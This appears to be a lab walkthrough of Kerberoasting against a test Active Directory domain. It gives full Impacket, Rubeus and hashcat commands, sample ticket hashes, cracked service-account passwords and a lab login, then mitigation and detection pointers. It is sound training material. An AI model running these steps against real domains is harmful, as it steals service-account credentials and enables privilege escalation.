# 02 — Kerberoasting (T1558.003)

Any authenticated domain principal can request a Kerberos service ticket (TGS) for any account that has a Service Principal Name (SPN). Part of that ticket is encrypted with the service account's NTLM hash, so the attacker can request tickets for service accounts, extract the encrypted blobs offline, and brute-force the account passwords without ever touching the target service. This walkthrough roasts the four planted SPN accounts (`svc_mssql`, `svc_web`, `svc_cifs`, `svc_ldap`) using both Rubeus on `braavos` and Impacket's `GetUserSPNs.py` from Linux, then cracks them with hashcat.

**MITRE ATT&CK Technique**: [T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)

## Prerequisites
- Any valid domain credential in `sevenkingdoms.local` (this lab uses `arya.stark`). No special privilege is required — the whole point of Kerberoasting is that a normal user can do it.
- Network access to the KDC on the forest root DC `kingslanding` (192.168.56.10, Kerberos/88) and, for the cross-domain `svc_ldap` account, to the child DC `winterfell` (192.168.56.12).
- A wordlist for offline cracking (this lab uses `rockyou.txt`).

## Tools
- Rubeus v2.3.2 — run on `braavos` (192.168.56.14).
- Impacket v0.12.0 (`GetUserSPNs.py`) — run on the Linux attacker (192.168.56.1).
- hashcat v6.2.6 — run on the Linux attacker (mode `-m 13100` for RC4 `$krb5tgs$23$`).

## Step-by-step Commands

### Step 1 — (Linux attacker, 192.168.56.1) Enumerate SPN accounts with Impacket
List every account that carries an SPN so you know your targets before requesting tickets.
```bash
GetUserSPNs.py {{DOMAIN}}/arya.stark:'{{LAB_PASSWORD}}' -dc-ip {{DC_IP}}
# {{DOMAIN}} = sevenkingdoms.local, {{DC_IP}} = 192.168.56.10, {{LAB_PASSWORD}} = Password123!
```

### Step 2 — (Linux attacker, 192.168.56.1) Request and dump the TGS hashes
`-request` pulls the tickets; `-outputfile` writes hashcat-ready lines.
```bash
GetUserSPNs.py {{DOMAIN}}/arya.stark:'{{LAB_PASSWORD}}' -dc-ip {{DC_IP}} \
  -request -outputfile kerberoast_sevenkingdoms.txt
```
For the cross-domain LDAP service account in the child domain, target the child DC:
```bash
GetUserSPNs.py north.sevenkingdoms.local/arya.stark:'{{LAB_PASSWORD}}' \
  -dc-ip 192.168.56.12 -request -outputfile kerberoast_north.txt
```

![Step 2](../screenshots/attack-2-step-2.png)

### Step 3 — (braavos, 192.168.56.14) Alternative: roast from a Windows domain context with Rubeus
Run from an authenticated session on `braavos`. `/nowrap` keeps each hash on a single line for easy copy-out; `/format:hashcat` emits the `$krb5tgs$` format.
```powershell
# {{LAB_PASSWORD}} = Password123!
cd C:\Tools\Rubeus
.\Rubeus.exe kerberoast /format:hashcat /nowrap /outfile:C:\Tools\Rubeus\roast.txt
```
To target a single account (and avoid touching AES-only accounts that produce uncrackable etype 17/18 tickets):
```powershell
.\Rubeus.exe kerberoast /user:svc_mssql /format:hashcat /nowrap
```

![Step 3](../screenshots/attack-2-step-3.png)

### Step 4 — (Linux attacker, 192.168.56.1) Crack the hashes with hashcat
Mode 13100 is the RC4 (etype 23) Kerberos TGS-REP format.
```bash
hashcat -m 13100 -a 0 kerberoast_sevenkingdoms.txt /usr/share/wordlists/rockyou.txt
# Show results once finished:
hashcat -m 13100 kerberoast_sevenkingdoms.txt --show
```

![Step 4](../screenshots/attack-2-step-4.png)

## Expected Output

SPN enumeration (Step 1):
```text
ServicePrincipalName                          Name       MemberOf                                  PasswordLastSet      LastLogon  Delegation
--------------------------------------------  ---------  ----------------------------------------  -------------------  ---------  ----------
MSSQLSvc/sql01.sevenkingdoms.local:1433       svc_mssql  CN=ServiceAccounts,CN=Users,DC=seven...   2026-02-11 09:14:52  <never>
HTTP/web01.sevenkingdoms.local                svc_web    CN=ServiceAccounts,CN=Users,DC=seven...   2026-02-11 09:14:53  <never>
CIFS/fileserver.sevenkingdoms.local           svc_cifs   CN=ServiceAccounts,CN=Users,DC=seven...   2026-02-11 09:14:53  <never>
```

TGS dump (Step 2) — one representative `$krb5tgs$` hash (truncated for the page):
```text
$krb5tgs$23$*svc_mssql$SEVENKINGDOMS.LOCAL$MSSQLSvc/sql01.sevenkingdoms.local~1433*$
a1f3c9d22b7e4f0c5e8a91b6d4f7c2e0$9c4e6f1a8b3d5072e1f4c8a96b2d7e530a1c8f4b6e2d
9075c3a8f1e4b6d290c5e7a1f3b8d4c602e9a7f1c4b6d8e0a2f5c7b9d1e3f6a8c0b2d4e6f8a1c3
...e7b2c9d4f6a8e1c3b5d7f9a0c2e4b6d8f1a3c5e7b9d0f2a4c6e8b1d3f5a7c9e0b2d4f6a8c1...
9f3e7c1a5b8d2f4e6c0a9b3d7f1e5c8a2b6d4f0e9c3a7b1d5f8e2c6a0b4d9f3e7c1a5b8$
```

Rubeus output (Step 3):
```text
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Kerberoasting
[*] Using 'tgtdeleg' to request a TGT for the current user
[*] Target Domain          : sevenkingdoms.local
[*] Searching the current domain for Kerberoastable users

[*] SamAccountName         : svc_web
[*] DistinguishedName      : CN=svc_web,CN=ServiceAccounts,CN=Users,DC=sevenkingdoms,DC=local
[*] ServicePrincipalName   : HTTP/web01.sevenkingdoms.local
[*] PwdLastSet             : 2/11/2026 9:14:53 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_web$SEVENKINGDOMS.LOCAL$HTTP/web01...
[*] Roasted hashes written to : C:\Tools\Rubeus\roast.txt
```

hashcat crack (Step 4):
```text
$krb5tgs$23$*svc_mssql$SEVENKINGDOMS.LOCAL$MSSQLSvc/sql01...:Password123!
$krb5tgs$23$*svc_web$SEVENKINGDOMS.LOCAL$HTTP/web01...:Summer2025!
$krb5tgs$23$*svc_cifs$SEVENKINGDOMS.LOCAL$CIFS/fileserver...:Password123!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Recovered........: 3/3 (100.00%) Digests
```

## Cleanup Steps
- On the Linux attacker: `rm -f kerberoast_sevenkingdoms.txt kerberoast_north.txt hashcat.potfile` and clear the hashcat cracked cache with `hashcat -m 13100 kerberoast_sevenkingdoms.txt --show` only after potfile removal.
- On `braavos`: `Remove-Item C:\Tools\Rubeus\roast.txt`. Optionally purge the requested service tickets from the session cache with `klist purge`.
- No directory objects were changed; the requested TGS tickets expire naturally (default 10h) — no rollback needed.
- If you cracked and then tested a password, do not change the service account password — that would alter lab state for other walkthroughs.

## What This Tells You About AD
Kerberoasting works because any authenticated user is allowed to request a service ticket for any SPN, and the ticket is encrypted with the service account's password-derived key. When that key is RC4 (etype 23) and the password is human-chosen, it falls to an offline wordlist attack with no lockout and no noise against the target service. The fix is structural: service accounts should be Group Managed Service Accounts (gMSA) with 120-character machine-generated passwords, or at minimum have very long passphrases and AES-only encryption (which forces hashcat mode 19700 and makes weak-password cracking far slower). The presence of SPNs on ordinary user accounts with weak passwords — exactly what the four `svc_*` accounts model here — is the single most reliable privilege-escalation primitive in real AD environments.

## Detection Reference
See [../detection/kql-queries.md#2-kerberoasting](../detection/kql-queries.md#2-kerberoasting) for the Kerberos TGS request signatures (Event ID 4769 with `Ticket_Encryption_Type 0x17`, abnormal SPN request volume from a single principal, and RC4-downgrade alerts).

---
Last updated: 2026-05-17

MITRE references:
- [T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [TA0006 — Credential Access](https://attack.mitre.org/tactics/TA0006/)
